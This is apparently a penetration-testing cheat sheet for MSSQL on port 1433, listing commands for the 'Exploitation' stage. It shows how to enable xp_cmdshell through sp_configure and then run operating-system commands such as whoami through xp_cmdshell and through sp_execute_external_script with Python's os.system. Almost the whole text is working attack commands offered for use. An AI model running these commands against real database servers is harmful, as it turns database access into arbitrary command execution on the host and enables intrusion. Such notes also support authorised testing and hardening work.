# 1433 - MSSQL

## Exploitation

### CLI Command Execution

```bash
# Check the status of xp_cmdshell (0 closed / 1 open).
EXEC sp_configure 'xp_cmdshell';

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

# Use xp_cmdshell to execute the whoami command
EXEC xp_cmdshell 'whoami';
EXEC dbName..xp_cmdshell 'whoami';

# Use sp_execute_external_script to call an external Python script to execute the whoami command
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```
